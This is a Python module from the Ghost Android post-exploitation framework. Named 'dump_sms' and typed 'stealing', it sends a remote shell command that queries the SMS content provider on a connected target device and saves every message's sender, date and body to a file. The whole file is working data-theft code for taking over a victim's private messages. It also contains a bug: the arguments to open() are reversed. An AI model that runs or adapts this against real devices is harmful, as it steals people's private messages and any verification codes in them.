#!/usr/bin/env python3

# Valentin Lobstein 2022
# Default Project : https://github.com/EntySec/Ghost

from beautifultable import BeautifulTable
from termcolor import colored
from core.badges import badges
from core.ghost import ghost

class GhostModule:
    def __init__(self):
        self.badges = badges()
        self.ghost = ghost()

        self.name = "dump_sms"
        self.description = "Dump SMS on target system."
        self.usage = "Usage: dump_sms <output_file>"
        self.type = "stealing"
        self.args = 2

    def run(self, cmd_data):
        
        print(self.badges.G + "Searching SMS :")
        result = self.ghost.send_command("shell","content query --uri content://sms/ --projection _id:address:date:body")
        if "Error while accessing provider:sms" in result:
             print(self.badges.E + "No SMS on the target system...")
        else:
            print(self.badges.G + "Dumped SMS...")
            with open('w',cmd_data.split(" ")[0]) as out:
                out.write(result)
            print(self.badges.G + f"Stored SMS on {cmd_data.split(' ')[0]}...")






